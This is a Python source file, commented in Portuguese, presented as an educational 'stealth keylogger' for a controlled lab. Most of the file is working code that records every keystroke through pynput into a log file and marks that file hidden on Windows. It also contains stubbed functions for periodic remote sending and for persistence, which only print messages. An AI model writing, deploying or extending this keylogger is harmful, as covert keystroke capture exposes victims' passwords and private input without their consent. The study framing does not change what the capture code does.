"""
Keylogger Furtivo Simulado para Fins Educacionais
Implementa técnicas de ocultação e execução em background
Projeto de Cibersegurança - Ambiente Controlado de Estudo
"""

from pynput import keyboard
import os
import sys
from datetime import datetime
import subprocess
import threading
import time

# Configurações
LOG_FILE = "Keylogger/log_furtivo.txt"
KEYS_CAPTURED = []

# Teclas a ignorar
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
    keyboard.Key.cmd_r,
}


def ocultar_console():
    """
    Tenta ocultar a janela do console (Windows).
    Em Linux, o script roda em background.
    """
    try:
        if sys.platform == "win32":
            import ctypes
            ctypes.windll.kernel32.SetConsoleCP(65001)
            # Minimiza a janela
            os.system("@echo off")
    except:
        pass


def registrar_tecla(tecla_pressionada):
    """
    Função chamada quando uma tecla é pressionada.
    Registra a tecla no arquivo de log de forma furtiva.
    """
    global KEYS_CAPTURED
    
    try:
        if isinstance(tecla_pressionada, keyboard.KeyCode):
            char = tecla_pressionada.char
            if char:
                KEYS_CAPTURED.append(char)
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(char)
        
        elif tecla_pressionada in IGNORAR:
            pass
        
        else:
            if tecla_pressionada == keyboard.Key.space:
                KEYS_CAPTURED.append(" ")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(" ")
            
            elif tecla_pressionada == keyboard.Key.enter:
                KEYS_CAPTURED.append("\n")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write("\n")
            
            elif tecla_pressionada == keyboard.Key.tab:
                KEYS_CAPTURED.append("\t")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write("\t")
            
            elif tecla_pressionada == keyboard.Key.backspace:
                KEYS_CAPTURED.append(" [BACKSPACE] ")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(" [BACKSPACE] ")
            
            elif tecla_pressionada == keyboard.Key.esc:
                KEYS_CAPTURED.append(" [ESC] ")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(" [ESC] ")
            
            else:
                KEYS_CAPTURED.append(f" [{str(tecla_pressionada)}] ")
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(f" [{str(tecla_pressionada)}] ")
    
    except AttributeError:
        pass


def enviar_dados_periodicamente():
    """
    Envia os dados capturados periodicamente (simulação de envio remoto).
    Em um cenário real, isso enviaria para um servidor remoto.
    """
    while True:
        time.sleep(30)  # A cada 30 segundos
        if len(KEYS_CAPTURED) > 10:
            # Aqui seria feito o envio remoto
            # Por exemplo, via HTTP POST ou email
            print(f"[*] Enviando {len(KEYS_CAPTURED)} teclas capturadas...")
            KEYS_CAPTURED.clear()


def iniciar_captura_furtiva():
    """
    Inicia o keylogger em modo furtivo com thread de envio.
    """
    # Oculta o console
    ocultar_console()
    
    print("[*] Keylogger Furtivo iniciado...")
    print(f"[*] Registrando em: {LOG_FILE}")
    print("[*] Rodando em background...")
    
    # Thread para envio periódico (simulado)
    thread_envio = threading.Thread(target=enviar_dados_periodicamente, daemon=True)
    thread_envio.start()
    
    # Inicia o listener
    with keyboard.Listener(on_press=registrar_tecla) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("\n[!] Keylogger parado")


def criar_arquivo_oculto():
    """
    Tenta criar o arquivo de log como oculto (Windows).
    """
    try:
        if sys.platform == "win32":
            import ctypes
            FILE_ATTRIBUTE_HIDDEN = 0x02
            ctypes.windll.kernel32.SetFileAttributesW(LOG_FILE, FILE_ATTRIBUTE_HIDDEN)
    except:
        pass


def persistencia():
    """
    Simula técnicas de persistência (educacional).
    Em um cenário real, adicionaria o script ao inicialização do sistema.
    """
    print("[*] Técnica de persistência (simulada):")
    print("    - Cópia para diretório de sistema")
    print("    - Adição ao registro (Windows) ou crontab (Linux)")
    print("    - Renomeação para nome legítimo")


if __name__ == "__main__":
    # Cria o arquivo de log
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write(f"=== KEYLOGGER FURTIVO - Iniciado em {datetime.now()} ===\n")
    
    # Tenta ocultar o arquivo
    criar_arquivo_oculto()
    
    # Inicia a captura furtiva
    iniciar_captura_furtiva()

